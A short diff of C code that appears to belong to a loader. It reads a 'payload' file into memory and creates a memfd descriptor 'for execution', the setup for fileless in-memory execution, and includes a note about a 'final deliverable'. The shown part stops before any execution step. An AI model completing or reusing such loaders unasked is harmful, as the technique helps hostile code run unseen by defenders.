@@ -1,7 +1,6 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
-#include <sys/stat.h> //for getting file size, remove for final deliverable
 #include <sys/mman.h>
 
 //#include <decompress.h>
@@ -49,6 +48,7 @@ int main(int argc, char **argv){
     fread(payload, sizeof(unsigned char), size, payload_file); // read file to heap
     fclose(payload_file); //close file
 
+    // TODO: Recreate payload_fd if invalid (has returned STDIN, STDOUT, and STDERR before)
     payload_fd = memfd_create("payload", 0); // create memory file descriptor for execution
     if (payload_fd <= 2){ 
         printf("memfd_create() failed. File descriptor created: %d\n", payload_fd);
